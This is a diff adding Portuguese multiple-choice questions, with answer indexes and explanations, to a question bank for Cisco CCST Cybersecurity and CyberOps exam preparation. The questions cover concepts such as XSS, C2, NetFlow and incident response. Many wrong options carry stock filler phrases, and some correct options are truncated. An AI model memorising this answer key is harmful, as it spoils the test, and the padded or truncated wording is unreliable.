+        "domain": "1.1"
+      },
+      {
+        "question": "No Modelo Diamante de análise de intrusões, que quatro características centrais são ligadas?",
+        "options": [
+          "Adversário, Capacidade, Infraestrutura, Vítima",
+          "Router, Switch, Firewall, Servidor",
+          "Vermelho, Azul, Roxo, Verde na maioria dos ambientes de produção",
+          "Preparação, Deteção, Recuperação, Revisão"
+        ],
+        "correct": 0,
+        "explanation": "O Modelo Diamante liga adversário, capacidade, infraestrutura e vítima para raciocinar sobre um evento de intrusão.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Os níveis de risco são muitas vezes classificados em baixo, médio, alto e extremamente alto sobretudo para ajudar as organizações a quê?",
+        "options": [
+          "Escolher a cor das secretárias",
+          "Priorizar que riscos tratar primeiro",
+          "Escolher a localização do escritório",
+          "Definir o canal do Wi-Fi"
+        ],
+        "correct": 1,
+        "explanation": "Classificar a gravidade do risco permite às organizações priorizar o esforço e o orçamento de mitigação nos riscos mais sérios primeiro.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.3"
+      },
+      {
+        "question": "O que contribui a gestão de ativos para a segurança dos endpoints?",
+        "options": [
+          "Torna os ecrãs maiores durante janelas de manutenção de rotina",
+          "Mantém um inventário para encontrar dispositivos desconhecidos ou desatualizados",
+          "Cifra o correio automaticamente em redes empresariais típicas",
+          "Acelera o CPU durante janelas de manutenção de rotina quando não existem outros controlos"
+        ],
+        "correct": 1,
+        "explanation": "Um inventário de hardware/software permite às equipas detetar dispositivos não geridos, rogue ou desatualizados que, de outro modo, seriam pontos cegos.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.3"
+      },
+      {
+        "question": "Que afirmação sobre spear phishing está correta?",
+        "options": [
+          "Tem como alvo uma pessoa ou organização específica com conteúdo à medida",
+          "É sempre enviado como carta impressa sem ferramentas adicionais",
+          "Nunca usa email em redes empresariais típicas durante janelas de manutenção de rotina",
+          "Só afeta routers em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "O spear phishing é direcionado: o atacante adapta o engodo a uma vítima específica usando detalhes pessoais ou organizacionais.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Que protocolo protege o tráfego web cifrando o HTTP?",
+        "options": [
+          "HTTPS (HTTP sobre TLS)",
+          "FTP durante janelas de manutenção de rotina",
+          "Telnet na maioria dos ambientes de produção",
+          "SNMPv1"
+        ],
+        "correct": 0,
+        "explanation": "O HTTPS corre HTTP sobre TLS para cifrar o tráfego web; FTP, Telnet e SNMPv1 enviam dados em texto simples por omissão.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Ao rever registos, que padrão sugere mais um ataque de força bruta ao início de sessão?",
+        "options": [
+          "Um início de sessão bem-sucedido de manhã",
+          "Muitos inícios de sessão falhados para uma conta em pouco tempo",
+          "Uma única consulta de DNS quando não existem outros controlos",
+          "Um evento de backup agendado na maioria dos ambientes de produção"
+        ],
+        "correct": 1,
+        "explanation": "Uma rajada de autenticações falhadas contra uma conta (ou várias) numa janela curta é uma assinatura clássica de força bruta/spraying.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "Qual é o principal papel de segurança de um servidor proxy no acesso web de saída?",
+        "options": [
+          "Atribui endereços IP aos clientes",
+          "Intermedeia e pode filtrar/registar os pedidos web dos clientes",
+          "Substitui totalmente a firewall durante janelas de manutenção de rotina",
+          "Cifra o disco local sem ferramentas adicionais"
+        ],
+        "correct": 1,
+        "explanation": "Um proxy direto intermedeia os pedidos web de saída dos clientes, permitindo filtragem, registo e inspeção de malware desse tráfego.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "O que significa 'endurecer' (hardening) um sistema?",
+        "options": [
+          "Adicionar-lhe mais RAM quando não existem outros controlos durante janelas de manutenção de rotina",
+          "Reduzir a superfície de ataque removendo serviços desnecessários e apertando a configuração",
+          "Pintar a caixa do servidor em redes empresariais típicas em parques de vários fabricantes",
+          "Aumentar a resolução do monitor durante janelas de manutenção de rotina"
+        ],
+        "correct": 1,
+        "explanation": "O hardening reduz a superfície de ataque: desativar serviços/portas não usados, remover contas por omissão, aplicar definições seguras e atualizações.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "Qual é o principal benefício da contabilização (o terceiro A do AAA)?",
+        "options": [
+          "Bloqueia todo o tráfego de rede quando não existem outros controlos",
+          "Regista as ações do utilizador para auditoria e forense",
+          "Cifra a base de dados de passwords",
+          "Atribui VLANs automaticamente segundo a prática comum"
+        ],
+        "correct": 1,
+        "explanation": "A contabilização regista o que os utilizadores autenticados fizeram (comandos, sessões, dados), apoiando auditoria, faturação e investigação de incidentes.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "O que procura fazer sobretudo um rootkit?",
+        "options": [
+          "Melhorar o desempenho do sistema segundo a prática comum",
+          "Esconder a sua presença e manter acesso privilegiado num sistema",
+          "Fazer cópias dos ficheiros do utilizador durante janelas de manutenção de rotina",
+          "Atualizar firmware com segurança em redes empresariais típicas"
+        ],
+        "correct": 1,
+        "explanation": "Um rootkit esconde malware e mantém acesso privilegiado furtivo, muitas vezes subvertendo o SO para que as ferramentas normais não o vejam.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Porque é que as gamas de IP privado (como 10.0.0.0/8) não são encaminháveis na Internet pública?",
+        "options": [
+          "Estão reservadas para uso interno e são descartadas pelos routers da Internet",
+          "São mais rápidas que os IP públicos durante janelas de manutenção de rotina",
+          "São só para IPv6 em redes empresariais típicas segundo a prática comum",
+          "São cifradas por conceção no dia a dia das operações quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "As gamas privadas da RFC 1918 estão reservadas para redes internas e não são encaminhadas na Internet pública, razão pela qual se usa NAT.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "O que são TTPs na análise de ameaças?",
+        "options": [
+          "Táticas, Técnicas e Procedimentos de um adversário",
+          "Protocolos de Tabela de Transporte",
+          "Portas de Terminal de Confiança",
+          "Passwords de Teste Temporárias segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "Os TTPs descrevem como um adversário opera: as suas táticas (objetivos), técnicas (métodos) e procedimentos (implementações específicas).",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Porque deve a documentação de incidente ser atualizada e partilhada com segurança durante a resposta?",
+        "options": [
+          "Para atrasar a investigação em redes empresariais típicas",
+          "Para manter os respondentes coordenados e preservar um registo rigoroso",
+          "Para expor as provas publicamente sem ferramentas adicionais",
+          "Para apagar todas as notas anteriores durante janelas de manutenção de rotina"
+        ],
+        "correct": 1,
+        "explanation": "Manter a documentação atual e partilhada com segurança mantém a equipa coordenada e preserva um registo rigoroso e admissível do incidente.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.2"
+      },
+      {
+        "question": "O que impõem sobretudo as permissões de ficheiros e diretórios?",
+        "options": [
+          "Que utilizadores ou processos podem ler",
+          "A taxa de atualização do ecrã",
+          "A ordem dos dispositivos de arranque",
+          "A largura do canal Wi-Fi em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "As permissões impõem controlo de acesso ao nível do sistema de ficheiros, decidindo que utilizadores/processos podem ler, escrever ou executar cada recurso.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "O que acrescenta a virtualização ao planeamento de segurança num centro de dados?",
+        "options": [
+          "Elimina a necessidade de atualizações",
+          "Várias VMs isoladas partilham hardware",
+          "Torna todos os servidores físicos de novo",
+          "Desativa os registos por omissão na maioria dos ambientes de produção"
+        ],
+        "correct": 1,
+        "explanation": "A virtualização consolida muitas VMs isoladas em hardware partilhado, por isso o isolamento das VMs, o hardening do hipervisor e os snapshots passam a ser preocupações de segurança.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Qual é o traço central que torna a engenharia social eficaz?",
+        "options": [
+          "Explora a confiança e o comportamento humano em vez de apenas falhas técnicas",
+          "Só funciona contra hardware antigo em parques de vários fabricantes durante janelas de manutenção de rotina",
+          "Exige acesso físico de cada vez quando não existem outros controlos",
+          "Precisa da chave privada da vítima em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "A engenharia social manipula as pessoas (confiança, urgência, autoridade) para contornar controlos técnicos, por isso a formação de sensibilização importa.",
+        "difficulty": "Fácil",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Qual é o papel de uma Autoridade de Certificação (CA) na PKI?",
+        "options": [
+          "Guarda as passwords dos utilizadores",
+          "Emite e atesta a autenticidade dos certificados digitais",
+          "Cifra o disco rígido sem ferramentas adicionais",
+          "Atribui endereços IP durante janelas de manutenção de rotina"
+        ],
+        "correct": 1,
+        "explanation": "Uma CA é um terceiro de confiança que emite e assina certificados, atestando que uma chave pública pertence à identidade indicada.",
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Como se relacionam ameaça, vulnerabilidade e exploit?",
+        "options": [
+          "Uma ameaça é uma fraqueza; um exploit é um desastre natural quando não existem outros controlos",
+          "Uma ameaça pode usar um exploit contra uma vulnerabilidade para causar dano",
+          "São três nomes para a mesma coisa sem ferramentas adicionais",
+          "Um exploit corrige sempre uma vulnerabilidade no dia a dia das operações"
+        ],
+        "correct": 1,
+        "explanation": "Uma ameaça é uma causa potencial de dano; uma vulnerabilidade é uma fraqueza; um exploit é o método que usa essa fraqueza.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.4"
+      },
+      {
+        "question": "No CVSS, o que descreve a métrica Attack Vector?",
+        "options": [
+          "Até onde o atacante pode estar para explorar a vulnerabilidade",
+          "O custo do kit de exploração em parques de vários fabricantes",
+          "A cor do alerta em redes empresariais típicas na maioria dos ambientes de produção",
+          "A idade da correção em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O Attack Vector classifica se a exploração exige alcance físico, local, adjacente ou de rede até ao componente vulnerável.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.7"
+      },
+      {
+        "question": "Que modelo de controlo de acesso atribui permissões com base no papel do sujeito?",
+        "options": [
+          "DAC",
+          "MAC",
+          "RBAC",
+          "ABAC"
+        ],
+        "correct": 2,
+        "explanation": "O Controlo de Acesso Baseado em Papéis (RBAC) concede direitos segundo os papéis; o DAC é dirigido pelo dono, o MAC por rótulos e o ABAC por atributos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.6"
+      },
+      {
+        "question": "O que usa o Controlo de Acesso Baseado em Atributos (ABAC) para decidir o acesso?",
+        "options": [
+          "Apenas uma password partilhada",
+          "Atributos do sujeito, objeto, ação e ambiente",
+          "Só o endereço MAC em redes empresariais típicas",
+          "A cor do cartão no dia a dia das operações"
+        ],
+        "correct": 1,
+        "explanation": "O ABAC avalia atributos do utilizador, recurso, ação e contexto (hora, localização) face a políticas para permitir ou negar.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.6"
+      },
+      {
+        "question": "Qual é a ideia central da defesa em profundidade para um analista de SOC?",
+        "options": [
+          "Um controlo perfeito basta em redes empresariais típicas",
+          "Vários controlos sobrepostos aumentam a chance de deteção e atrasam o atacante",
+          "Os registos devem ser desativados para poupar espaço",
+          "Todo o tráfego dentro da LAN deve ser de confiança na maioria dos ambientes de produção"
+        ],
+        "correct": 1,
+        "explanation": "A defesa em profundidade significa controlos em camadas para que a deteção e o atraso continuem possíveis mesmo se uma camada falhar.",
+        "difficulty": "Fácil",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.5"
+      },
+      {
+        "question": "Que cinco campos formam a 5-tupla clássica usada para isolar um host nos registos de rede?",
+        "options": [
+          "IP de origem, IP de destino, porta de origem, porta de destino, protocolo",
+          "Utilizador, password, VLAN, SSID, gateway na maioria dos ambientes de produção",
+          "MAC, número de série, modelo, firmware, fabricante",
+          "Hash do ficheiro, caminho, tamanho, dono, ACL"
+        ],
+        "correct": 0,
+        "explanation": "A 5-tupla (IP origem, IP destino, porta origem, porta destino, protocolo) identifica de forma única um fluxo e ajuda a isolar um host comprometido nos registos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.10"
+      },
+      {
+        "question": "Como difere a deteção baseada em regras da deteção comportamental?",
+        "options": [
+          "A baseada em regras corresponde a assinaturas conhecidas",
+          "A baseada em regras só funciona offline; a comportamental só online",
+          "São abordagens idênticas em redes empresariais típicas",
+          "A comportamental nunca gera alertas"
+        ],
+        "correct": 0,
+        "explanation": "A deteção por regras/assinaturas corresponde a padrões conhecidos; a comportamental/estatística assinala anomalias face a uma linha de base de atividade normal.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.11"
+      },
+      {
+        "question": "Porque é que a cifra pode dificultar a monitorização de segurança?",
+        "options": [
+          "Apenas abranda o CPU na maioria dos ambientes de produção quando não existem outros controlos",
+          "Os conteúdos cifrados escondem-se de sensores de rede sem capacidade de decifra",
+          "Apaga todos os registos segundo a prática comum no dia a dia das operações",
+          "Desativa o DHCP segundo a prática comum quando não existem outros controlos"
+        ],
+        "correct": 1,
+        "explanation": "A cifra ponta a ponta esconde o conteúdo dos payloads a NIDS/proxies que não podem decifrar, reduzindo a visibilidade sobre conteúdo malicioso.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "1.8"
+      },
+      {
+        "question": "Como diferem superfície de ataque e vulnerabilidade?",
+        "options": [
+          "A superfície de ataque é o conjunto de pontos expostos",
+          "São sinónimos sem ferramentas adicionais",
+          "A superfície de ataque é sempre um erro em parques de vários fabricantes",
+          "Uma vulnerabilidade é só o número de portas abertas"
+        ],
+        "correct": 0,
+        "explanation": "A superfície de ataque é o conjunto de pontos de entrada que um adversário pode tentar; uma vulnerabilidade é uma fraqueza concreta que pode existir nesses pontos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.1"
+      },
+      {
+        "question": "Que tipo de dados fornece sobretudo o NetFlow para a monitorização de segurança?",
+        "options": [
+          "Payloads completos dos pacotes",
+          "Metadados de sessão como quem falou com quem",
+          "Chaves de cifra de disco segundo a prática comum",
+          "O corpo das mensagens de correio"
+        ],
+        "correct": 1,
+        "explanation": "O NetFlow (e dados de fluxo semelhantes) regista metadados de ligação — extremos, portas, bytes, duração — sem guardar os payloads completos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "2.2"
+      },
+      {
+        "question": "O que dá uma captura completa de pacotes (PCAP) que o NetFlow não dá?",
+        "options": [
+          "Apenas o endereço MAC de origem",
+          "O conteúdo real dos payloads dos pacotes",
+          "Apenas o ID da VLAN no dia a dia das operações",
+          "Apenas as concessões DHCP"
+        ],
+        "correct": 1,
+        "explanation": "O PCAP guarda os pacotes completos incluindo payloads, permitindo análise profunda do conteúdo que os metadados de fluxo sozinhos não dão.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "2.2"
+      },
+      {
+        "question": "Como difere tipicamente uma firewall de nova geração (NGFW) de uma firewall stateful tradicional?",
+        "options": [
+          "Uma NGFW acrescenta consciência de aplicação",
+          "Uma NGFW nunca acompanha o estado",
+          "Uma NGFW só funciona na Camada 1 sem ferramentas adicionais",
+          "Não há diferença segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "As NGFW acrescentam identificação de aplicações, filtragem de URL/conteúdo e muitas vezes prevenção de intrusões e inspeção de malware em cima da filtragem stateful.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "2.2"
+      },
+      {
+        "question": "Como pode o NAT/PAT reduzir a visibilidade para um SOC que revê tráfego de entrada?",
+        "options": [
+          "Ao esconder muitos hosts internos atrás de um endereço público",
+          "Ao apagar todos os registos NetFlow sem ferramentas adicionais",
+          "Ao cifrar o SIEM no dia a dia das operações",
+          "Ao desativar o DNS em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "O PAT multiplexa muitos hosts internos atrás de um IP público, pelo que os registos de entrada podem mostrar só o endereço público se não houver correlação com registos internos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "O que descreve melhor um ataque de rede baseado em protocolo?",
+        "options": [
+          "Abusar de funcionalidades ou fraquezas de protocolos (por exemplo SYN floods",
+          "Apenas phishing por email durante janelas de manutenção de rotina",
+          "Apenas o roubo físico de um portátil durante janelas de manutenção de rotina",
+          "Apenas quebrar hashes de passwords offline"
+        ],
+        "correct": 0,
+        "explanation": "Os ataques baseados em protocolo usam indevidamente o comportamento dos protocolos (inundações, amplificação, pacotes malformados) para perturbar ou enganar serviços de rede.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
+      },
+      {
+        "question": "Qual é o objetivo principal de um ataque de cross-site scripting (XSS)?",
+        "options": [
+          "Injetar scripts maliciosos numa página web de confiança vista por outros utilizadores",
+          "Inundar um servidor DNS de consultas no dia a dia das operações sem ferramentas adicionais",
+          "Roubar um módulo de segurança de hardware na maioria dos ambientes de produção",
+          "Reescrever rotas BGP na maioria dos ambientes de produção no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "O XSS injeta script controlado pelo atacante numa página em que o browser das vítimas confia, muitas vezes para roubar sessões ou agir como o utilizador.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
+      },
+      {
+        "question": "O que procura tipicamente fazer um ataque de injeção de comandos contra uma aplicação web?",
+        "options": [
+          "Correr comandos da shell do SO através de entrada não sanitizada",
+          "Melhorar o layout da página em parques de vários fabricantes",
+          "Rodar certificados TLS no dia a dia das operações durante janelas de manutenção de rotina",
+          "Desativar o JavaScript em redes empresariais típicas"
+        ],
+        "correct": 0,
+        "explanation": "A injeção de comandos passa entrada controlada pelo atacante para uma shell ou chamada de sistema, permitindo correr comandos no servidor.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
+      },
+      {
+        "question": "Como pode a IA generativa alterar os ataques de engenharia social?",
+        "options": [
+          "Pode produzir phishing mais convincente e personalizado à escala",
+          "Torna a engenharia social impossível em parques de vários fabricantes",
+          "Só ajuda os defensores, nunca os atacantes",
+          "Elimina a necessidade de qualquer acesso à rede"
+        ],
+        "correct": 0,
+        "explanation": "A IA generativa pode criar phishing fluente e personalizado à escala, e deepfakes, elevando a qualidade dos engodos de engenharia social.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.7"
+      },
+      {
+        "question": "Qual é o papel de um canal de comando e controlo (C2) num ataque a um endpoint?",
+        "options": [
+          "Permite ao atacante dirigir remotamente os hosts comprometidos",
+          "É o feed de atualização do antivírus",
+          "É a renovação da concessão DHCP em parques de vários fabricantes",
+          "É o spooler da impressora no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "O C2 é o caminho de comunicação usado pelo malware para o atacante emitir comandos e receber dados dos hosts comprometidos.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.8"
+      },
+      {
+        "question": "Porque usam os atacantes túneis ou cifra como técnicas de evasão?",
+        "options": [
+          "Para fazer o tráfego malicioso parecer ou esconder-se dentro de protocolos permitidos",
+          "Para acelerar transferências legítimas quando não existem outros controlos durante janelas de manutenção de rotina",
+          "Para reduzir o uso de CPU na vítima durante janelas de manutenção de rotina",
+          "Para forçar atualizações em redes empresariais típicas no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "Túneis e cifra escondem C2 ou exfiltração dentro de protocolos permitidos (HTTPS, DNS, SSH), contornando filtros simples.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
+      },
+      {
+        "question": "Como afetam os certificados a monitorização de segurança do tráfego HTTPS?",
+        "options": [
+          "Sem interceção TLS ou telemetria no endpoint",
+          "Os certificados apagam todo o NetFlow",
+          "Os certificados bloqueiam o ARP em parques de vários fabricantes",
+          "Os certificados forçam apenas IPv6"
+        ],
+        "correct": 0,
+        "explanation": "O HTTPS cifra os payloads; sem um ponto de interceção TLS ou telemetria no host, os sensores de rede veem pouco do conteúdo.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.10"
+      },
+      {
+        "question": "Que componente de um certificado X.509 nomeia a entidade a que pertence?",
+        "options": [
+          "O campo Subject",
+          "O TTL de um registo DNS",
+          "O ID da VLAN",
+          "O tamanho do MTU"
+        ],
+        "correct": 0,
+        "explanation": "Os campos Subject (e Subject Alternative Name) identificam a entidade para a qual o certificado foi emitido.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "cripto",
+        "domain": "2.11"
+      },
+      {
+        "question": "O que monitoriza sobretudo um sistema de deteção de intrusões baseado em host (HIDS)?",
+        "options": [
+          "A atividade e os ficheiros num único host",
+          "Apenas o tráfego entre dois routers",
+          "Apenas a faturação na cloud quando não existem outros controlos",
+          "Apenas as filas das impressoras"
+        ],
+        "correct": 0,
+        "explanation": "Um HIDS observa a atividade ao nível do host (registos, ficheiros, processos) nessa máquina, complementando o IDS de rede.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "Na forense digital, o que é prova corroborativa?",
+        "options": [
+          "Prova que apoia outras provas mas não basta sozinha",
+          "A única peça de prova necessária",
+          "Prova que contradiz o caso segundo a prática comum",
+          "Prova que deve ser apagada sem ferramentas adicionais"
+        ],
+        "correct": 0,
+        "explanation": "A prova corroborativa apoia outras descobertas mas não provaria o caso sozinha; a melhor prova é a fonte primária mais fiável.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.4"
+      },
+      {
+        "question": "O que inclui tipicamente o relatório de uma sandbox de malware (câmara de detonação)?",
+        "options": [
+          "O comportamento observado da amostra quando executada num ambiente controlado",
+          "O salário da vítima quando não existem outros controlos sem ferramentas adicionais",
+          "A planta do escritório quando não existem outros controlos",
+          "A password Wi-Fi do SOC durante janelas de manutenção de rotina"
+        ],
+        "correct": 0,
+        "explanation": "Uma sandbox corre uma amostra em isolamento e reporta o comportamento (ficheiros, rede, registo) para ajudar os analistas a classificá-la em segurança.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.6"
+      },
+      {
+        "question": "Na qualidade da deteção, o que é um falso positivo?",
+        "options": [
+          "Um alerta gerado quando não havia ameaça real",
+          "Um ataque detetado corretamente",
+          "Um ataque falhado em parques de vários fabricantes",
+          "Um início de sessão bem-sucedido"
+        ],
+        "correct": 0,
+        "explanation": "Um falso positivo é um alerta que dispara sem evento malicioso real, desperdiçando tempo do analista; um falso negativo é um ataque real falhado.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.2"
+      },
+      {
+        "question": "Como difere a inspeção profunda de pacotes (DPI) da filtragem simples de pacotes?",
+        "options": [
+          "A DPI examina o conteúdo do payload para além dos cabeçalhos e portas",
+          "A DPI só olha para o preâmbulo Ethernet sem ferramentas adicionais",
+          "A DPI desativa todos os registos no dia a dia das operações quando não existem outros controlos",
+          "A DPI só funciona em UDP na maioria dos ambientes de produção"
+        ],
+        "correct": 0,
+        "explanation": "Os filtros de pacotes usam cabeçalhos/portas; a DPI inspeciona o conteúdo da camada de aplicação para identificar ameaças ou aplicações.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "firewall-vpn",
+        "domain": "4.3"
+      },
+      {
+        "question": "Qual é uma diferença-chave entre um IPS em linha e um tap passivo para monitorização?",
+        "options": [
+          "O IPS em linha pode bloquear tráfego; um tap só observa uma cópia",
+          "Um tap pode bloquear tráfego; o IPS em linha não",
+          "São funcionalmente idênticos na maioria dos ambientes de produção",
+          "Um tap cifra todos os pacotes"
+        ],
+        "correct": 0,
+        "explanation": "Um IPS em linha fica no caminho e pode descartar pacotes; um tap/SPAN só recebe uma cópia e não pode bloquear.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.4"
+      },
+      {
+        "question": "Ao analisar um PCAP de uma suspeita de intrusão, que elementos devem ser identificados primeiro?",
+        "options": [
+          "Endereços de origem e destino",
+          "Apenas o nome do ficheiro de captura",
+          "Apenas o nome de utilizador do analista",
+          "Apenas o brilho do ecrã quando não existem outros controlos"
+        ],
+        "correct": 0,
+        "explanation": "Os elementos-chave de uma intrusão num PCAP são quem falou com quem (IPs), em que portas, que protocolos e como são os payloads.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.7"
+      },
+      {
+        "question": "Que artefacto é comummente usado para identificar amostras de malware conhecidas entre sistemas?",
+        "options": [
+          "Um hash criptográfico do ficheiro (por exemplo SHA-256)",
+          "A cor do fundo do ambiente de trabalho",
+          "O modelo da impressora durante janelas de manutenção de rotina",
+          "O código postal do escritório"
+        ],
+        "correct": 0,
+        "explanation": "Os hashes de ficheiro identificam amostras de forma única para que o mesmo malware seja reconhecido entre hosts e feeds de threat intel.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.9"
+      },
+      {
+        "question": "Porque aprendem os analistas de SOC expressões regulares básicas?",
+        "options": [
+          "Para corresponder e extrair padrões em registos e dados de pacotes de forma eficiente",
+          "Para substituir a necessidade de firewalls quando não existem outros controlos",
+          "Para atribuir endereços IP em redes empresariais típicas quando não existem outros controlos",
+          "Para configurar RAID em parques de vários fabricantes segundo a prática comum"
+        ],
+        "correct": 0,
+        "explanation": "As regex permitem aos analistas filtrar e extrair padrões (IPs, URLs, hashes) rapidamente em grandes conjuntos de registos e PCAPs.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.10"
+      },
+      {
+        "question": "O que envolve sobretudo a gestão de vulnerabilidades?",
+        "options": [
+          "Identificar, priorizar e remediar fraquezas ao longo do tempo",
+          "Apenas comprar novas firewalls na maioria dos ambientes de produção",
+          "Apenas repor passwords mensalmente em parques de vários fabricantes",
+          "Apenas pintar os armários de servidores"
+        ],
+        "correct": 0,
+        "explanation": "A gestão de vulnerabilidades é o processo contínuo de encontrar, classificar e corrigir fraquezas em todo o parque.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "5.1"
+      },
+      {
+        "question": "Segundo o NIST SP 800-61, que atividade pertence à fase de Preparação?",
+        "options": [
+          "Construir playbooks, contactos e ferramentas antes de um incidente",
+          "Apagar todas as provas após um incidente sem ferramentas adicionais",
+          "Ignorar alertas sem ferramentas adicionais",
+          "Partilhar passwords num quadro branco em parques de vários fabricantes"
+        ],
+        "correct": 0,
+        "explanation": "A Preparação cobre políticas, playbooks, contactos, ferramentas e formação para a equipa responder eficazmente quando ocorrer um incidente.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Segundo a ordem de volatilidade, que prova deve ser capturada antes de uma imagem de disco?",
+        "options": [
+          "Registos do CPU e conteúdos da RAM",
+          "Cópias em fita arquivadas do ano passado",
+          "Manuais impressos sem ferramentas adicionais",
+          "Cartazes de parede"
+        ],
+        "correct": 0,
+        "explanation": "Os dados voláteis (CPU, RAM, estado de rede) desaparecem ao desligar, por isso são recolhidos antes de armazenamento menos volátil como imagens de disco.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.6"
+      },
+      {
+        "question": "Que elemento é usado ao perfilar uma rede para deteção de anomalias?",
+        "options": [
+          "Débito típico, duração das sessões, portas e espaço de endereços de ativos críticos",
+          "A cor dos cabos de patch na maioria dos ambientes de produção",
+          "A marca das cadeiras em redes empresariais típicas na maioria dos ambientes de produção",
+          "O tipo de letra dos emails no dia a dia das operações"
+        ],
+        "correct": 0,
+        "explanation": "A perfilagem de rede estabelece a linha de base de débito, duração de sessões, portas em uso e gamas críticas para que os desvios se destaquem.",
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.7"
+      },
+      {
+        "question": "Ao perfilar um servidor para segurança, que item é útil para a linha de base?",
